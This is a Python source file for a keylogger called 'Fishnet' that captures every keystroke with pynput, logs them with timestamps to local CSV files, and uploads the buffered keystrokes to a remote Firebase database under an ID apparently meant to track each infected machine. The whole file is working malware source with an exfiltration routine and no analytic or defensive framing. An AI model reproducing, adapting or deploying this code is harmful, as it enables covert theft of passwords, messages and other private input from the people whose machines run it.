from datetime import datetime
import csv
import os
# import pynput
import firebase_admin
from firebase_admin import credentials, db
from pynput.keyboard import Key, Listener
import time
import winsound
import threading

#
limit = 250
lock = threading.Lock()

BUFFER = []
NET_ID = 'FISHNET_REAL_1'


def init_file():
    if (not os.path.exists("fishes")):
        os.mkdir("fishes")

    file = open('./fishes/' + str(datetime.now().strftime("%d-%m-%Y %H-%M-%S")) + '.csv', 'w')

    # file = open('./fishes/test.csv', 'w')

    fields = ['data', 'time', 'date']

    file_writer = csv.writer(file)

    file_writer.writerow(fields)

    return file_writer


def make_an_entry(val):
    global writer, BUFFER

    date = datetime.now().strftime("%d-%m-%Y")
    time = datetime.now().strftime("%H-%M-%S")

    data = [val, time, date]
    lock.acquire()
    BUFFER.append(data)
    lock.release()
    # print("making an entry", )
    writer.writerow(data)


def init_db():
    global ref
    cred = credentials.Certificate("./auth.json")
    firebase_admin.initialize_app(cred,
                                  {
                                      'databaseURL': 'https://python-real-default-rtdb.firebaseio.com/'
                                  })

    timestamp = str(datetime.now().strftime("%d-%m-%Y_%H-%M-%S"))

    reference = '/' + NET_ID + '/' + timestamp + '/data/'

    # tree struct? virus_num -> timestamp -> entry -> 1. data 2. date 3. time

    ref = db.reference(reference)


def insert_entry_to_cloud(entry):
    global ref
    # print("started writer thread", n, BUFFER)

    # print("pushing", entry)

    go_ahead = True

    while go_ahead:
        try:
            ref.push(
                {
                    'data': str(entry[0]),
                    'time': str(entry[1]),
                    'date': str(entry[2])
                }
            )
            break
        except:
            print("retry")
            time.sleep(2)


def death_sequence():
    print("Stared death sequence")
    while BUFFER:
        lock.acquire()
        insert_entry_to_cloud(BUFFER.pop(0))
        lock.release()




def alive(key):
    global limit
    global writer
    print("pressed", key)
    make_an_entry(key)
    # winsound.Beep(500, 100)
    limit -= 1

    print("limit", limit, "Buffer", BUFFER)

    if not limit:
        death = threading.Thread(None, death_sequence, args=())
        death.start()
        limit = 5
        # listener.stop()


if __name__ == '__main__':
    print("Started  Fishnet")

    global writer, ref

    go_ahead = True
    writer = init_file()

    while go_ahead:
        try:
            init_db()
            go_ahead = False
        except:
            print("Retry")
            time.sleep(2)



    # file is named after me and i alone control it
    # I am the disciple of the

    with Listener(on_press=alive) as listener:
        print("started to listen")
        listener.join()
